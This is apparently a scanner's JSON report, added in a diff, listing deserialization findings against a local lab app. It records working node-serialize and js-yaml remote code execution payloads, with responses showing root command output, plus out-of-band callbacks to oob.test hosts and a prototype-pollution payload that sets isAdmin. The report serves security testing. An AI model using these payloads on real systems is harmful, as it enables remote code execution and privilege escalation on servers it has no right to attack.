@@ -1,0 +1,1321 @@
+{
+    "target": "localhost:8088",
+    "disclaimer": "All findings are Suspected — the tool flags candidates and never auto-confirms; verify each manually.",
+    "stats": {
+        "vectors_scanned": 21,
+        "after_filter": 14,
+        "findings": 14,
+        "dynamic_strong": 7,
+        "oob": {
+            "status": "ran",
+            "collector": "http://172.27.32.1:9000",
+            "base_domain": "oob.test",
+            "tokens_polled": 14,
+            "confirmed": 6
+        }
+    },
+    "findings": [
+        {
+            "url": "http://localhost:8088/api/dashboard",
+            "method": "GET",
+            "location": "cookie",
+            "name": "session",
+            "occurrences": 1,
+            "oob_token": "ac008298932e",
+            "type": "NodeJS",
+            "subtype": "node-serialize RCE",
+            "confidence": "High",
+            "exploit_type": "node-serialize RCE",
+            "suggested_probe": "node_serialize",
+            "severity": "Critical",
+            "severity_note": null,
+            "evidence": "dynamic-strong",
+            "notes": "node-serialize RCE pattern detected | Inject: {\"x\":\"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()\"}",
+            "normalized": [
+                "_$$ND_FUNC$$_function () { return this.username; }"
+            ],
+            "mutations_count": 4,
+            "indicators": [
+                "OOB callback received (1 hit(s)) on token ac008298932e — out-of-band interaction observed: the payload was deserialized and triggered an outbound lookup/request (suspected; verify manually — a callback does not by itself prove arbitrary code execution)"
+            ],
+            "attempts": [
+                {
+                    "payload_type": "node_serialize_rce",
+                    "chain": "node-serialize IIFE",
+                    "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('id');}()",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 256,
+                        "body_sample": "{\"username\":\"wiener\",\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Node.js edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a known device.\",\"time\":\"3 days ago\"}]}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 256,
+                        "body_sample": "{\"username\":\"wiener\",\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Node.js edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a known device.\",\"time\":\"3 days ago\"}]}"
+                    }
+                },
+                {
+                    "payload_type": "node_serialize_rce",
+                    "chain": "node-serialize IIFE",
+                    "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('whoami');}()",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 256,
+                        "body_sample": "{\"username\":\"wiener\",\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Node.js edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a known device.\",\"time\":\"3 days ago\"}]}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 256,
+                        "body_sample": "{\"username\":\"wiener\",\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Node.js edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a known device.\",\"time\":\"3 days ago\"}]}"
+                    }
+                },
+                {
+                    "payload_type": "node_serialize_rce",
+                    "chain": "node-serialize IIFE",
+                    "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('hostname');}()",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 256,
+                        "body_sample": "{\"username\":\"wiener\",\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Node.js edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a known device.\",\"time\":\"3 days ago\"}]}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 256,
+                        "body_sample": "{\"username\":\"wiener\",\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Node.js edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a known device.\",\"time\":\"3 days ago\"}]}"
+                    }
+                },
+                {
+                    "payload_type": "node_serialize_oob",
+                    "chain": "node-serialize IIFE: http.get",
+                    "payload": "_$$ND_FUNC$$_function(){require('http').get('http://ac008298932e.oob.test/').on('error',function(){});}()",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 256,
+                        "body_sample": "{\"username\":\"wiener\",\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Node.js edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a known device.\",\"time\":\"3 days ago\"}]}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 256,
+                        "body_sample": "{\"username\":\"wiener\",\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Node.js edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a known device.\",\"time\":\"3 days ago\"}]}"
+                    }
+                }
+            ],
+            "oob_confirmed": true
+        },
+        {
+            "url": "http://localhost:8088/api/profile",
+            "method": "GET",
+            "location": "cookie",
+            "name": "session",
+            "occurrences": 1,
+            "oob_token": "91ee065a45e0",
+            "type": "NodeJS",
+            "subtype": "node-serialize RCE",
+            "confidence": "High",
+            "exploit_type": "node-serialize RCE",
+            "suggested_probe": "node_serialize",
+            "severity": "Critical",
+            "severity_note": null,
+            "evidence": "dynamic-strong",
+            "notes": "node-serialize RCE pattern detected | Inject: {\"x\":\"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()\"}",
+            "normalized": [
+                "_$$ND_FUNC$$_function () { return this.username; }"
+            ],
+            "mutations_count": 4,
+            "indicators": [
+                "OOB callback received (1 hit(s)) on token 91ee065a45e0 — out-of-band interaction observed: the payload was deserialized and triggered an outbound lookup/request (suspected; verify manually — a callback does not by itself prove arbitrary code execution)"
+            ],
+            "attempts": [
+                {
+                    "payload_type": "node_serialize_rce",
+                    "chain": "node-serialize IIFE",
+                    "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('id');}()",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 91,
+                        "body_sample": "{\"username\":\"wiener\",\"email\":\"wiener@acme-portal.test\",\"joined\":\"2025-01-15\",\"admin\":false}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 91,
+                        "body_sample": "{\"username\":\"wiener\",\"email\":\"wiener@acme-portal.test\",\"joined\":\"2025-01-15\",\"admin\":false}"
+                    }
+                },
+                {
+                    "payload_type": "node_serialize_rce",
+                    "chain": "node-serialize IIFE",
+                    "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('whoami');}()",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 91,
+                        "body_sample": "{\"username\":\"wiener\",\"email\":\"wiener@acme-portal.test\",\"joined\":\"2025-01-15\",\"admin\":false}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 91,
+                        "body_sample": "{\"username\":\"wiener\",\"email\":\"wiener@acme-portal.test\",\"joined\":\"2025-01-15\",\"admin\":false}"
+                    }
+                },
+                {
+                    "payload_type": "node_serialize_rce",
+                    "chain": "node-serialize IIFE",
+                    "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('hostname');}()",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 91,
+                        "body_sample": "{\"username\":\"wiener\",\"email\":\"wiener@acme-portal.test\",\"joined\":\"2025-01-15\",\"admin\":false}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 91,
+                        "body_sample": "{\"username\":\"wiener\",\"email\":\"wiener@acme-portal.test\",\"joined\":\"2025-01-15\",\"admin\":false}"
+                    }
+                },
+                {
+                    "payload_type": "node_serialize_oob",
+                    "chain": "node-serialize IIFE: http.get",
+                    "payload": "_$$ND_FUNC$$_function(){require('http').get('http://91ee065a45e0.oob.test/').on('error',function(){});}()",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 91,
+                        "body_sample": "{\"username\":\"wiener\",\"email\":\"wiener@acme-portal.test\",\"joined\":\"2025-01-15\",\"admin\":false}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 91,
+                        "body_sample": "{\"username\":\"wiener\",\"email\":\"wiener@acme-portal.test\",\"joined\":\"2025-01-15\",\"admin\":false}"
+                    }
+                }
+            ],
+            "oob_confirmed": true
+        },
+        {
+            "url": "http://localhost:8088/api/import-config",
+            "method": "POST",
+            "location": "raw_body",
+            "name": "payload",
+            "occurrences": 1,
+            "oob_token": "2c7091c8c313",
+            "type": "NodeJS",
+            "subtype": "Prototype Pollution",
+            "confidence": "Medium",
+            "exploit_type": "Prototype Pollution",
+            "suggested_probe": "proto_pollution",
+            "severity": "High",
+            "severity_note": null,
+            "evidence": "dynamic-strong",
+            "notes": "__proto__ detected — try polluting Object.prototype",
+            "normalized": [
+                "{\"theme\":\"dark\",\"lang\":\"en\",\"__proto__\":{\"note\":\"demo\"}}"
+            ],
+            "mutations_count": 1,
+            "indicators": [
+                "Response content differs in a small, localized way despite same status (similarity=0.94) (baseline='{\"success\":true,\"config\":{\"theme\":\"dark\",\"lang\":\"en\",\"pollutionProof\":{\"isAdmin\":null,\"polluted\":null}}}' mutated='{\"success\":true,\"config\":{\"theme\":\"dark\",\"lang\":\"en\",\"pollutionProof\":{\"isAdmin\":true,\"polluted\":true}}}')"
+            ],
+            "attempts": [
+                {
+                    "payload_type": "prototype_pollution",
+                    "chain": "__proto__ injection",
+                    "payload": "{\"theme\": \"dark\", \"lang\": \"en\", \"__proto__\": {\"isAdmin\": true, \"polluted\": true}}",
+                    "signal": "strong",
+                    "indicators": [
+                        "Response content differs in a small, localized way despite same status (similarity=0.94) (baseline='{\"success\":true,\"config\":{\"theme\":\"dark\",\"lang\":\"en\",\"pollutionProof\":{\"isAdmin\":null,\"polluted\":null}}}' mutated='{\"success\":true,\"config\":{\"theme\":\"dark\",\"lang\":\"en\",\"pollutionProof\":{\"isAdmin\":true,\"polluted\":true}}}')"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 104,
+                        "body_sample": "{\"success\":true,\"config\":{\"theme\":\"dark\",\"lang\":\"en\",\"pollutionProof\":{\"isAdmin\":null,\"polluted\":null}}}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 104,
+                        "body_sample": "{\"success\":true,\"config\":{\"theme\":\"dark\",\"lang\":\"en\",\"pollutionProof\":{\"isAdmin\":true,\"polluted\":true}}}"
+                    }
+                }
+            ]
+        },
+        {
+            "url": "http://localhost:8088/api/import",
+            "method": "POST",
+            "location": "raw_body",
+            "name": "payload",
+            "occurrences": 1,
+            "oob_token": "4fc1fbaea0d3",
+            "type": "NodeJS",
+            "subtype": "node-serialize RCE",
+            "confidence": "High",
+            "exploit_type": "node-serialize RCE",
+            "suggested_probe": "node_serialize",
+            "severity": "Critical",
+            "severity_note": null,
+            "evidence": "dynamic-strong",
+            "notes": "node-serialize RCE pattern detected | Inject: {\"x\":\"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()\"}",
+            "normalized": [
+                "_$$ND_FUNC$$_function () { return 1; }"
+            ],
+            "mutations_count": 4,
+            "indicators": [
+                "OOB callback received (1 hit(s)) on token 4fc1fbaea0d3 — out-of-band interaction observed: the payload was deserialized and triggered an outbound lookup/request (suspected; verify manually — a callback does not by itself prove arbitrary code execution)",
+                "Observation: response length changed by -13 bytes (baseline=91 mutated=78, same status 200) — possible behavioral change, verify manually",
+                "Response content differs in a small, localized way despite same status (similarity=0.86) (baseline='{\"success\":true,\"restored\":\"{ theme: \\'dark\\', lang: \\'en\\', render: [Function (anonymous)] }\"}' mutated='{\"success\":true,\"restored\":\"{ theme: \\'dark\\', lang: \\'en\\', render: undefined }\"}')"
+            ],
+            "attempts": [
+                {
+                    "payload_type": "node_serialize_rce",
+                    "chain": "node-serialize IIFE",
+                    "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('id');}()",
+                    "signal": "strong",
+                    "indicators": [
+                        "Observation: response length changed by -13 bytes (baseline=91 mutated=78, same status 200) — possible behavioral change, verify manually",
+                        "Response content differs in a small, localized way despite same status (similarity=0.86) (baseline='{\"success\":true,\"restored\":\"{ theme: \\'dark\\', lang: \\'en\\', render: [Function (anonymous)] }\"}' mutated='{\"success\":true,\"restored\":\"{ theme: \\'dark\\', lang: \\'en\\', render: undefined }\"}')"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 91,
+                        "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 78,
+                        "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: undefined }\"}"
+                    }
+                },
+                {
+                    "payload_type": "node_serialize_rce",
+                    "chain": "node-serialize IIFE",
+                    "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('whoami');}()",
+                    "signal": "strong",
+                    "indicators": [
+                        "Observation: response length changed by -13 bytes (baseline=91 mutated=78, same status 200) — possible behavioral change, verify manually",
+                        "Response content differs in a small, localized way despite same status (similarity=0.86) (baseline='{\"success\":true,\"restored\":\"{ theme: \\'dark\\', lang: \\'en\\', render: [Function (anonymous)] }\"}' mutated='{\"success\":true,\"restored\":\"{ theme: \\'dark\\', lang: \\'en\\', render: undefined }\"}')"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 91,
+                        "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 78,
+                        "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: undefined }\"}"
+                    }
+                },
+                {
+                    "payload_type": "node_serialize_rce",
+                    "chain": "node-serialize IIFE",
+                    "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('hostname');}()",
+                    "signal": "strong",
+                    "indicators": [
+                        "Observation: response length changed by -13 bytes (baseline=91 mutated=78, same status 200) — possible behavioral change, verify manually",
+                        "Response content differs in a small, localized way despite same status (similarity=0.86) (baseline='{\"success\":true,\"restored\":\"{ theme: \\'dark\\', lang: \\'en\\', render: [Function (anonymous)] }\"}' mutated='{\"success\":true,\"restored\":\"{ theme: \\'dark\\', lang: \\'en\\', render: undefined }\"}')"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 91,
+                        "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 78,
+                        "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: undefined }\"}"
+                    }
+                },
+                {
+                    "payload_type": "node_serialize_oob",
+                    "chain": "node-serialize IIFE: http.get",
+                    "payload": "_$$ND_FUNC$$_function(){require('http').get('http://4fc1fbaea0d3.oob.test/').on('error',function(){});}()",
+                    "signal": "strong",
+                    "indicators": [
+                        "Observation: response length changed by -13 bytes (baseline=91 mutated=78, same status 200) — possible behavioral change, verify manually",
+                        "Response content differs in a small, localized way despite same status (similarity=0.86) (baseline='{\"success\":true,\"restored\":\"{ theme: \\'dark\\', lang: \\'en\\', render: [Function (anonymous)] }\"}' mutated='{\"success\":true,\"restored\":\"{ theme: \\'dark\\', lang: \\'en\\', render: undefined }\"}')"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 91,
+                        "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 78,
+                        "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: undefined }\"}"
+                    }
+                }
+            ],
+            "oob_confirmed": true
+        },
+        {
+            "url": "http://localhost:8088/api/restore-prefs",
+            "method": "POST",
+            "location": "raw_body",
+            "name": "payload",
+            "occurrences": 1,
+            "oob_token": "89e2e02a5a30",
+            "type": "NodeJS",
+            "subtype": "node-serialize RCE",
+            "confidence": "High",
+            "exploit_type": "node-serialize RCE",
+            "suggested_probe": "node_serialize",
+            "severity": "Critical",
+            "severity_note": null,
+            "evidence": "dynamic-strong",
+            "notes": "node-serialize RCE pattern detected | Inject: {\"x\":\"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()\"}",
+            "normalized": [
+                "_$$ND_FUNC$$_function () { return 1; }"
+            ],
+            "mutations_count": 4,
+            "indicators": [
+                "OOB callback received (1 hit(s)) on token 89e2e02a5a30 — out-of-band interaction observed: the payload was deserialized and triggered an outbound lookup/request (suspected; verify manually — a callback does not by itself prove arbitrary code execution)",
+                "Observation: response length changed by -13 bytes (baseline=91 mutated=78, same status 200) — possible behavioral change, verify manually",
+                "Response content differs in a small, localized way despite same status (similarity=0.86) (baseline='{\"success\":true,\"restored\":\"{ theme: \\'dark\\', lang: \\'en\\', render: [Function (anonymous)] }\"}' mutated='{\"success\":true,\"restored\":\"{ theme: \\'dark\\', lang: \\'en\\', render: undefined }\"}')"
+            ],
+            "attempts": [
+                {
+                    "payload_type": "node_serialize_rce",
+                    "chain": "node-serialize IIFE",
+                    "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('id');}()",
+                    "signal": "strong",
+                    "indicators": [
+                        "Observation: response length changed by -13 bytes (baseline=91 mutated=78, same status 200) — possible behavioral change, verify manually",
+                        "Response content differs in a small, localized way despite same status (similarity=0.86) (baseline='{\"success\":true,\"restored\":\"{ theme: \\'dark\\', lang: \\'en\\', render: [Function (anonymous)] }\"}' mutated='{\"success\":true,\"restored\":\"{ theme: \\'dark\\', lang: \\'en\\', render: undefined }\"}')"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 91,
+                        "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 78,
+                        "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: undefined }\"}"
+                    }
+                },
+                {
+                    "payload_type": "node_serialize_rce",
+                    "chain": "node-serialize IIFE",
+                    "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('whoami');}()",
+                    "signal": "strong",
+                    "indicators": [
+                        "Observation: response length changed by -13 bytes (baseline=91 mutated=78, same status 200) — possible behavioral change, verify manually",
+                        "Response content differs in a small, localized way despite same status (similarity=0.86) (baseline='{\"success\":true,\"restored\":\"{ theme: \\'dark\\', lang: \\'en\\', render: [Function (anonymous)] }\"}' mutated='{\"success\":true,\"restored\":\"{ theme: \\'dark\\', lang: \\'en\\', render: undefined }\"}')"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 91,
+                        "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 78,
+                        "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: undefined }\"}"
+                    }
+                },
+                {
+                    "payload_type": "node_serialize_rce",
+                    "chain": "node-serialize IIFE",
+                    "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('hostname');}()",
+                    "signal": "strong",
+                    "indicators": [
+                        "Observation: response length changed by -13 bytes (baseline=91 mutated=78, same status 200) — possible behavioral change, verify manually",
+                        "Response content differs in a small, localized way despite same status (similarity=0.86) (baseline='{\"success\":true,\"restored\":\"{ theme: \\'dark\\', lang: \\'en\\', render: [Function (anonymous)] }\"}' mutated='{\"success\":true,\"restored\":\"{ theme: \\'dark\\', lang: \\'en\\', render: undefined }\"}')"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 91,
+                        "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 78,
+                        "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: undefined }\"}"
+                    }
+                },
+                {
+                    "payload_type": "node_serialize_oob",
+                    "chain": "node-serialize IIFE: http.get",
+                    "payload": "_$$ND_FUNC$$_function(){require('http').get('http://89e2e02a5a30.oob.test/').on('error',function(){});}()",
+                    "signal": "strong",
+                    "indicators": [
+                        "Observation: response length changed by -13 bytes (baseline=91 mutated=78, same status 200) — possible behavioral change, verify manually",
+                        "Response content differs in a small, localized way despite same status (similarity=0.86) (baseline='{\"success\":true,\"restored\":\"{ theme: \\'dark\\', lang: \\'en\\', render: [Function (anonymous)] }\"}' mutated='{\"success\":true,\"restored\":\"{ theme: \\'dark\\', lang: \\'en\\', render: undefined }\"}')"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 91,
+                        "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 78,
+                        "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: undefined }\"}"
+                    }
+                }
+            ],
+            "oob_confirmed": true
+        },
+        {
+            "url": "http://localhost:8088/api/import-async",
+            "method": "POST",
+            "location": "raw_body",
+            "name": "payload",
+            "occurrences": 1,
+            "oob_token": "d019602901b3",
+            "type": "NodeJS",
+            "subtype": "node-serialize RCE",
+            "confidence": "High",
+            "exploit_type": "node-serialize RCE",
+            "suggested_probe": "node_serialize",
+            "severity": "Critical",
+            "severity_note": null,
+            "evidence": "dynamic-strong",
+            "notes": "node-serialize RCE pattern detected | Inject: {\"x\":\"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()\"}",
+            "normalized": [
+                "_$$ND_FUNC$$_function () { return 1; }"
+            ],
+            "mutations_count": 4,
+            "indicators": [
+                "OOB callback received (1 hit(s)) on token d019602901b3 — out-of-band interaction observed: the payload was deserialized and triggered an outbound lookup/request (suspected; verify manually — a callback does not by itself prove arbitrary code execution)"
+            ],
+            "attempts": [
+                {
+                    "payload_type": "node_serialize_rce",
+                    "chain": "node-serialize IIFE",
+                    "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('id');}()",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 15,
+                        "body_sample": "{\"queued\":true}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 15,
+                        "body_sample": "{\"queued\":true}"
+                    }
+                },
+                {
+                    "payload_type": "node_serialize_rce",
+                    "chain": "node-serialize IIFE",
+                    "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('whoami');}()",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 15,
+                        "body_sample": "{\"queued\":true}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 15,
+                        "body_sample": "{\"queued\":true}"
+                    }
+                },
+                {
+                    "payload_type": "node_serialize_rce",
+                    "chain": "node-serialize IIFE",
+                    "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('hostname');}()",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 15,
+                        "body_sample": "{\"queued\":true}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 15,
+                        "body_sample": "{\"queued\":true}"
+                    }
+                },
+                {
+                    "payload_type": "node_serialize_oob",
+                    "chain": "node-serialize IIFE: http.get",
+                    "payload": "_$$ND_FUNC$$_function(){require('http').get('http://d019602901b3.oob.test/').on('error',function(){});}()",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 15,
+                        "body_sample": "{\"queued\":true}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 15,
+                        "body_sample": "{\"queued\":true}"
+                    }
+                }
+            ],
+            "oob_confirmed": true
+        },
+        {
+            "url": "http://localhost:8088/api/import-yaml",
+            "method": "POST",
+            "location": "raw_body",
+            "name": "payload",
+            "occurrences": 1,
+            "oob_token": "9f48d1cbe05c",
+            "type": "YAML",
+            "subtype": "YAML JS Function RCE (js-yaml)",
+            "confidence": "High",
+            "exploit_type": "YAML JS Function RCE (js-yaml)",
+            "suggested_probe": "yaml_exec",
+            "severity": "Critical",
+            "severity_note": null,
+            "evidence": "dynamic-strong",
+            "notes": "Matched: YAML JS Function RCE (js-yaml) (pattern: !!js/(?:function|undefined|regexp)|!<tag:yaml\\.org,2002:js/) | Vulnerable only with an unsafe loader (yaml.load / YAML.unsafe_load / Psych object mode), not a safe_load",
+            "normalized": [
+                "name: default\nonLoad: !<tag:yaml.org,2002:js/function> 'function () { return true; }'\nenabled: true"
+            ],
+            "mutations_count": 4,
+            "indicators": [
+                "OOB callback received (1 hit(s)) on token 9f48d1cbe05c — out-of-band interaction observed: the payload was deserialized and triggered an outbound lookup/request (suspected; verify manually — a callback does not by itself prove arbitrary code execution)",
+                "Observation: response length changed by +31 bytes (baseline=72 mutated=103, same status 200) — possible behavioral change, verify manually"
+            ],
+            "attempts": [
+                {
+                    "payload_type": "yaml_js_function",
+                    "chain": "js-yaml !!js/function",
+                    "payload": "hook: !<tag:yaml.org,2002:js/function> \"function(){ return global.process.mainModule.require('child_process').execSync('id').toString() }\"",
+                    "signal": "weak",
+                    "indicators": [
+                        "Observation: response length changed by +31 bytes (baseline=72 mutated=103, same status 200) — possible behavioral change, verify manually"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 72,
+                        "body_sample": "{\"success\":true,\"config\":{\"name\":\"default\",\"hooks\":1,\"output\":[\"true\"]}}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 103,
+                        "body_sample": "{\"success\":true,\"config\":{\"name\":null,\"hooks\":1,\"output\":[\"uid=0(root) gid=0(root) groups=0(root)\\n\"]}}"
+                    }
+                },
+                {
+                    "payload_type": "yaml_js_function",
+                    "chain": "js-yaml !!js/function",
+                    "payload": "hook: !<tag:yaml.org,2002:js/function> \"function(){ return global.process.mainModule.require('child_process').execSync('whoami').toString() }\"",
+                    "signal": "weak",
+                    "indicators": [
+                        "Observation: response length changed by -3 bytes (baseline=72 mutated=69, same status 200) — possible behavioral change, verify manually",
+                        "Response content differs in a small, localized way despite same status (similarity=0.88) (baseline='{\"success\":true,\"config\":{\"name\":\"default\",\"hooks\":1,\"output\":[\"true\"]}}' mutated='{\"success\":true,\"config\":{\"name\":null,\"hooks\":1,\"output\":[\"root\\\\n\"]}}')",
+                        "Control probe (non-serialized junk) returned the same status 200 and a near-identical body (similarity=0.92) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 72,
+                        "body_sample": "{\"success\":true,\"config\":{\"name\":\"default\",\"hooks\":1,\"output\":[\"true\"]}}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 69,
+                        "body_sample": "{\"success\":true,\"config\":{\"name\":null,\"hooks\":1,\"output\":[\"root\\n\"]}}"
+                    }
+                },
+                {
+                    "payload_type": "yaml_js_function",
+                    "chain": "js-yaml !!js/function",
+                    "payload": "hook: !<tag:yaml.org,2002:js/function> \"function(){ return global.process.mainModule.require('child_process').execSync('hostname').toString() }\"",
+                    "signal": "weak",
+                    "indicators": [
+                        "Observation: response length changed by +5 bytes (baseline=72 mutated=77, same status 200) — possible behavioral change, verify manually",
+                        "Response content differs in a small, localized way despite same status (similarity=0.83) (baseline='{\"success\":true,\"config\":{\"name\":\"default\",\"hooks\":1,\"output\":[\"true\"]}}' mutated='{\"success\":true,\"config\":{\"name\":null,\"hooks\":1,\"output\":[\"ca306de75d2c\\\\n\"]}}')",
+                        "Control probe (non-serialized junk) returned the same status 200 and a near-identical body (similarity=0.87) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 72,
+                        "body_sample": "{\"success\":true,\"config\":{\"name\":\"default\",\"hooks\":1,\"output\":[\"true\"]}}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 77,
+                        "body_sample": "{\"success\":true,\"config\":{\"name\":null,\"hooks\":1,\"output\":[\"ca306de75d2c\\n\"]}}"
+                    }
+                },
+                {
+                    "payload_type": "yaml_js_function_oob",
+                    "chain": "js-yaml !!js/function: http.get",
+                    "payload": "hook: !<tag:yaml.org,2002:js/function> \"function(){ return global.process.mainModule.require('http').get('http://9f48d1cbe05c.oob.test/').on('error',function(){}); }\"",
+                    "signal": "weak",
+                    "indicators": [
+                        "Observation: response length changed by +6 bytes (baseline=72 mutated=78, same status 200) — possible behavioral change, verify manually",
+                        "Response content differs in a small, localized way despite same status (similarity=0.84) (baseline='{\"success\":true,\"config\":{\"name\":\"default\",\"hooks\":1,\"output\":[\"true\"]}}' mutated='{\"success\":true,\"config\":{\"name\":null,\"hooks\":1,\"output\":[\"[object Object]\"]}}')",
+                        "Control probe (non-serialized junk) returned the same status 200 and a near-identical body (similarity=0.86) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 72,
